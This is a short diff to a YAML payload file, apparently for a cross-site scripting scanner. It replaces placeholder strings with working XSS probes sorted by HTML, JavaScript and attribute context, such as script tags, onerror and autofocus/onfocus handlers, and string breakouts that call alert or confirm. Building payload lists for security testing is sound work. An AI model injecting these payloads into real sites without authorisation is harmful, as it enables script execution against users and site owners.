@@ -1,10 +1,12 @@
 payloads:
     - html_context:
-        - teste1
-        - teste2
+        - <script>alert(document.domain)</script>
+        - <img src=1 onerror=alert(1)>
     - js_context:
-        - teste3
-        - teste4
+        - -(confirm)(document.domain)//
+        - ; alert(1);//
+        - '-alert(document.domain)-'
+        - ';alert(document.domain)//
     - attr_context:
-        - teste5
-        - teste6
+        - "><script>alert(1)</script><"
+        - " autofocus onfocus=alert(1) x="
